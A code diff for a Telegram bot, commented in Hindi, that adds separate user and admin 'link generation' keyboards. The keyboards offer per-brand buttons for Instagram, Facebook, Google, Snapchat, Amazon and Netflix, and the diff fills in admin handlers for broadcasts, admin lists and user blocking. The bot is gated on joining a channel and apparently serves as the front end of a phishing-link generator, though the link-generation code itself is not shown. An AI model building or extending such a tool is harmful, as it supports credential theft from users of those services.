@@ -63,12 +63,18 @@ const createAdminKeyboard = (status) => {
     ]);
 };
 
-const linkGenerationKeyboard = Markup.inlineKeyboard([
+// NAYA FIX: User ke liye alag se saaf-suthra keyboard
+const userLinkGenerationKeyboard = Markup.inlineKeyboard([
     [Markup.button.callback('📸 Instagram', 'gen_link_Instagram'), Markup.button.callback('📘 Facebook', 'gen_link_Facebook')],
     [Markup.button.callback('🇬 Google', 'gen_link_Google'), Markup.button.callback('👻 Snapchat', 'gen_link_Snapchat')],
-    [Markup.button.callback('📦 Amazon', 'gen_link_Amazon'), Markup.button.callback('🎬 Netflix', 'gen_link_Netflix')],
+    [Markup.button.callback('📦 Amazon', 'gen_link_Amazon'), Markup.button.callback('🎬 Netflix', 'gen_link_Netflix')]
+]);
+
+const adminLinkGenerationKeyboard = Markup.inlineKeyboard([
+    ...userLinkGenerationKeyboard.reply_markup.inline_keyboard,
     [Markup.button.callback('⬅️ Back to Panel', 'admin_panel_back')]
 ]);
+
 
 // --- /start COMMAND ---
 bot.start(async (ctx) => {
@@ -79,7 +85,7 @@ bot.start(async (ctx) => {
     if (db.blocked_users.includes(userId)) return;
 
     if (!isAdmin(userId) && db.bot_status === 'maintenance') {
-        return ctx.reply('⚠️ **Bot is under maintenance.**\n\nThe bot is temporarily offline for users. Please try again later.');
+        return ctx.reply('⚠️ **Bot is under maintenance.** Please try again later.');
     }
 
     try {
@@ -97,9 +103,8 @@ bot.start(async (ctx) => {
             const adminKeyboard = createAdminKeyboard(db.bot_status);
             await ctx.replyWithMarkdown('👑 *Admin Panel Activated*', adminKeyboard);
         } else {
-            // NAYA FIX: Keyboard ab aam user ko sahi se dikhega
-            const userLinkKeyboard = Markup.inlineKeyboard(linkGenerationKeyboard.reply_markup.inline_keyboard.slice(0, -1));
-            await ctx.replyWithMarkdown(startMessage, userLinkKeyboard);
+            // NAYA FIX: User ko ab hamesha buttons dikhenge
+            await ctx.replyWithMarkdown(startMessage, userLinkGenerationKeyboard);
         }
     } catch {
         await ctx.replyWithMarkdown(`🛑 *ACCESS DENIED*\n\nJoin our channel to continue.`, Markup.inlineKeyboard([
@@ -136,13 +141,66 @@ bot.on('callback_query', async (ctx) => {
             return ctx.editMessageText("👑 *Admin Panel*", { parse_mode: 'Markdown', ...newAdminKeyboard });
         }
         
-        // ... (Baaki saare admin commands ka logic waisa hi rahega) ...
+        const prompts = { 'broadcast': '✍️ Send the message to broadcast.', 'add': '✍️ Send the numeric ID of the new admin.', 'remove': '✍️ Send the numeric ID to remove from admins.', 'block': '✍️ Send the numeric ID of the user to block.', 'unblock': '✍️ Send the numeric ID of the user to unblock.' };
+        if (prompts[command]) {
+            adminState[userId] = command;
+            return ctx.reply(prompts[command]);
+        }
+
+        switch(command) {
+            case 'status':
+                const totalUsers = Object.keys(db.users).length;
+                return ctx.editMessageText(`📊 *Bot Status*\n\n👥 Total Users: ${totalUsers}\n👑 Admins: ${db.admins.length}\n🚫 Blocked: ${db.blocked_users.length}`, { parse_mode: 'Markdown', ...createAdminKeyboard(db.bot_status) });
+            case 'generate':
+                return ctx.editMessageText("🔗 **Admin Link Generator**", adminLinkGenerationKeyboard);
+            case 'panel':
+                return ctx.editMessageText("👑 **Admin Panel**", { parse_mode: 'Markdown', ...createAdminKeyboard(db.bot_status) });
+        }
     }
 });
 
 // --- Text Handler ---
 bot.on('text', async (ctx) => {
-    // ... (Text handler ka code waisa hi rahega) ...
+    const userId = ctx.from.id;
+    const text = ctx.message.text;
+    if (text.startsWith('/') || !adminState[userId] || !isAdmin(userId)) return;
+
+    const db = readDb();
+    const action = adminState[userId];
+    delete adminState[userId];
+    const targetId = parseInt(text);
+
+    switch (action) {
+        case 'broadcast':
+            ctx.reply("📢 Broadcasting...");
+            for (const uid of Object.keys(db.users)) {
+                try { await ctx.telegram.sendMessage(uid, text); } catch {}
+            }
+            return ctx.reply("✅ Broadcast complete.");
+        case 'add':
+            if (!isNaN(targetId) && !db.admins.includes(targetId)) {
+                db.admins.push(targetId); writeDb(db);
+                return ctx.reply(`✅ Admin added: ${targetId}`);
+            }
+            return ctx.reply("❌ Invalid or existing admin.");
+        case 'remove':
+            if (targetId === parseInt(OWNER_ID)) return ctx.reply("❌ Cannot remove owner.");
+            db.admins = db.admins.filter(id => id !== targetId); writeDb(db);
+            return ctx.reply(`✅ Removed admin: ${targetId}`);
+        case 'block':
+            if (isAdmin(targetId)) return ctx.reply("❌ Cannot block admin.");
+            if (!db.blocked_users.includes(targetId)) {
+                db.blocked_users.push(targetId); writeDb(db);
+                return ctx.reply(`🚫 Blocked: ${targetId}`);
+            }
+            return ctx.reply("⚠️ Already blocked.");
+        case 'unblock':
+            if (db.blocked_users.includes(targetId)) {
+                db.blocked_users = db.blocked_users.filter(id => id !== targetId); writeDb(db);
+                return ctx.reply(`✅ Unblocked: ${targetId}`);
+            }
+            return ctx.reply("❌ ID not found in block list.");
+    }
 });
 
 // --- "STAY-ALIVE" SERVER ---
